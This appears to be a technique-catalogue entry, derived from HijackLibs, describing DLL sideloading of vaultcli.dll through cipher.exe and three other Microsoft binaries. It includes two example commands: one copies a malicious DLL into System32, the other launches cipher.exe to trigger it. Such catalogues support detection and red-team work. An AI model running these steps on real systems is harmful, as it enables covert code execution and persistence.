---
trust_level: community
id: windows-dllhijack-vaultcli
namespace: windows:dllhijack:vaultcli
name: vaultcli.dll
description: "vaultcli.dll — Sideloading hijacking (Microsoft)"
author: "Wietze Beukema"
version: "1.0.0"
capabilities:
  - security.defenseevasion.dll-hijack
platforms:
  - windows
techniques:
  - defense-evasion
  - persistence
execution:
  template: "vaultcli.dll"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
references:
  - label: "Reference"
    url: "https://wietze.github.io/blog/hijacking-dlls-in-windows"
  - label: "HijackLibs"
    url: "https://hijacklibs.net/entries/vaultcli.html"
---
examples:
  - description: "Place malicious vaultcli.dll in the search order location"
    command: "copy malicious.dll \"%SYSTEM32%\\vaultcli.dll\""
  - description: "Execute the vulnerable binary to trigger the hijack"
    command: "\"%SYSTEM32%\\cipher.exe\""

# vaultcli.dll

**Vendor:** Microsoft

**Expected Location:** %SYSTEM32%

**Vulnerable Executables:**
- %SYSTEM32%\cipher.exe (Sideloading)
- %SYSTEM32%\efsui.exe (Sideloading)
- %SYSTEM32%\rekeywiz.exe (Sideloading)
- %SYSTEM32%\vaultcmd.exe (Sideloading)

**Acknowledgement:** Wietze
